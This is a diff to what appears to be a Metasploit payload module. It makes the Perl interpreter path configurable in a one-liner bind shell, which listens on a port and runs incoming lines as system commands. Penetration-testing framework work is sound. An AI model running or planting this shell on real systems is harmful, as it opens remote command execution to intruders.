@@ -29,6 +29,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('PERL_PATH', [true, 'The path to Perl interpreter', 'perl'])
+    ])
   end
 
   #
@@ -44,7 +47,7 @@ module MetasploitModule
   #
   def command_string
 
-    cmd = "perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
+    cmd = "#{datastore['PERL_PATH']} -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
 
     return cmd
   end
